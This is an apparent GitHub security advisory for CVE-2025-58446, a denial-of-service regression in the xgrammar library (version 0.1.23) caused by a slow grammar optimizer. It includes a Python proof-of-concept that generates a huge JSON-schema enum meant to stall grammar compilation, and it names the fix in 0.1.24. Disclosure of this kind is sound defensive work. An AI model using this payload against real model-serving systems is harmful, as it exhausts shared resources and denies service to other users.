# [M] xgrammar vulnerable to denial of service by huge enum grammar

## Summary
Severity: Medium
Advisory: GHSA-9q5r-wfvf-rr7f
CVE: CVE-2025-58446
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X (CVSS_V4)
Published: 2025-09-05
Source: https://github.com/advisories/GHSA-9q5r-wfvf-rr7f
Type: github-advisory

## Affected
- PyPI: `xgrammar` — affected >=0.1.23 <0.1.24

## Details
### Summary
Provided grammar, would fit in a context window of most of the models, but takes minutes to process in 0.1.23. In testing with 0.1.16 the parser worked fine so this seems to be a regression caused by Earley parser.

### Details

Full reproducer provider in the POC section. The resulting grammar is around 70k tokens, and the grammar parsing itself (with the models I checked) was significantly longer than LLM processing itself, meaning this can be used to DOS model providers.

### Patch

This problem is caused by the grammar optimizer introduced in v0.1.23 being too slow. It only happens for very large grammars (>100k characters), like the below one. v0.1.24 solved this problem by optimizing the speed of the grammar optimizer and disable some slow optimization for large grammars. 

Thanks to @Seven-Streams 

### PoC
```
import string
import random

def enum_schema(size=10000,str_len=10):
    enum =  {"enum": ["".join(random.choices(string.ascii_uppercase, k=str_len)) for _ in range(size)]}
    schema = {
        "definitions": {
            "colorEnum": enum
        },
        "type": "object",
        "properties": {
            "color1": {
                "$ref": "#/definitions/colorEnum"
            },
            "color2": {
                "$ref": "#/definitions/colorEnum"
            },
            "color3": {
                "$ref": "#/definitions/colorEnum"
            },
            "color4": {
                "$ref": "#/definitions/colorEnum"
            },
            "color5": {
                "$ref": "#/definitions/colorEnum"
            },
            "color6": {
                "$ref": "#/definitions/colorEnum"
            },
            "color7": {
                "$ref": "#/definitions/colorEnum"
            },
            "color8": {
                "$ref": "#/definitions/colorEnum"
            }
        },
        "required": [
                "color1",
                "color2"
         ]
    }
    return schema

schema_enum = enum_schema()
print(schema_enum)
print(test_schema(schema_enum, {}))
```

where:
```
def test_schema(schema, instance):
    grammar = xgr.Grammar.from_json_schema(
        json.dumps(schema),
        strict_mode=True
    )
    return _is_grammar_accept_string(grammar, json.dumps(instance))
```

### Impact
DOS

## References
- https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-9q5r-wfvf-rr7f
- https://nvd.nist.gov/vuln/detail/CVE-2025-58446
- https://github.com/mlc-ai/xgrammar/commit/ced69c3ad2f8f61b516cc278a342e7c644383e27
- https://github.com/mlc-ai/xgrammar
